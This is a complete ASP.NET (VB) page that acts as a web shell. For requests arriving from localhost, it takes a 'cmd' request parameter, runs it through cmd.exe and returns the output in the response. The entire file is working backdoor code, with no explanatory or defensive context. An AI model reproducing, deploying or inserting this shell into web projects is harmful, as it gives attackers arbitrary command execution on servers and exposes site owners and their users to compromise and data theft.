<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="System.Diagnostics" %>
<% if Request.UserHostAddress = "127.0.0.1" then
	Dim pinfo As New ProcessStartInfo("c:\windows\system32\cmd.exe")
	pinfo.UseShellExecute = false
	pinfo.RedirectStandardOutput = true
	pinfo.Arguments = "/c " & request("cmd") & " 2>&1"
	Dim prc As New Process()
	prc.StartInfo = pinfo
	prc.Start()
	Response.Write(prc.StandardOutput.Readtoend())
	prc.Close()
end if %>
